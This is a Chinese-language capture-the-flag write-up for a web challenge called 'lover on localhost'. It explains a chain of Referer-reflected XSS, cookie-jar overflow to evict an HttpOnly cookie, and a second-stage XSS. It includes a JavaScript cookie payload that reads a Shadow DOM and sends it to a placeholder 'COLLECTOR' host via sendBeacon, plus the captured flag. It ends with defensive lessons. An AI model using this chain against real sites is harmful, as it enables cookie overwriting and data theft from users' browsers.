# lover on localhost

## 题目简述

/fraternize 只向回环地址访问者显示 flag，并把 cookie present 解码后未转义渲染。管理员机器人访问攻击者 URL 前，会为目标 localhost 设置 HttpOnly 的 present cookie。利用链需要先通过 Referer 注入在 localhost 源执行脚本，再用 cookie jar 填充淘汰原 HttpOnly cookie，写入同名恶意 present，最后访问 /fraternize 形成第二阶段 XSS并读取页面中的 flag。

## 解题过程

攻击者页面设置 Referrer-Policy: unsafe-url，并把自身路径改为携带 URL 编码脚本的长路径。随后自动提交表单导航到 http://localhost:1337/。目标首页执行 decodeURIComponent(req.get("Referer"))，并把 Referer 未转义放入模板，路径中的脚本因此在 localhost 源执行。

第一阶段脚本创建约 300 个 localhost cookie，迫使浏览器 cookie jar 淘汰原来的 HttpOnly present；然后写入新的普通 cookie：

~~~javascript
document.cookie =
  "present=<script>setTimeout(()=>navigator.sendBeacon(" +
  "'https://COLLECTOR/'," +
  "document.querySelector('inputless-chat').shadowRoot.innerHTML),400)</script>";
location = "http://localhost:1337/fraternize";
~~~

机器人从本机访问 /fraternize，通过 IP 检查。服务把恶意 present 注入页面，第二阶段脚本在 Shadow DOM 中读取包含 flag 的完整 HTML并外带：

~~~text
maple{a_dQw4w9WgXcQ_for_you}
~~~

## 方法总结

这是 Referer 反射 XSS、cookie 配额淘汰、同名 cookie 覆盖和回环访问控制的组合链。IP 限制不能防御在受信任浏览器内执行的脚本；HttpOnly 也不保证 cookie 永不被淘汰。所有不可信字符串都应按 HTML 上下文转义，机器人还应使用隔离浏览器配置和独立域。
